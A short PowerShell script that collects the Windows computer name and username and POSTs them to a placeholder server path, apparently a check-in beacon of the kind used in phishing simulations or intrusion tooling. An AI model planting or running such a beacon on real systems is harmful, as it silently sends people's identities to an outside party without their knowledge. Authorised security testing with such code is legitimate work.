$url = "http://SERVER_ADDRESS_HERE/pb/pb.php?path=hello"

$comp_name = [uri]::EscapeDataString($ENV:COMPUTERNAME)
$user_name = [uri]::EscapeDataString($ENV:USERNAME)

$post_data = ("user=" + $user_name + "&comp=" + $comp_name)

$buffer = [System.Text.Encoding]::UTF8.GetBytes($post_data)

$request = [System.Net.WebRequest]::Create($url)
$request.ContentType = "application/x-www-form-urlencoded"
$request.ContentLength = $buffer.Length
$request.Method = "POST"

$requestStream = $request.GetRequestStream()
$requestStream.Write($buffer, 0, $buffer.Length)
$requestStream.flush()
$requestStream.close()

[System.Net.HttpWebResponse] $response = $request.GetResponse()
$streamReader = New-Object System.IO.StreamReader($response.GetResponseStream())
$result = $streamReader.ReadToEnd()

$streamReader.Close()
$response.Close()
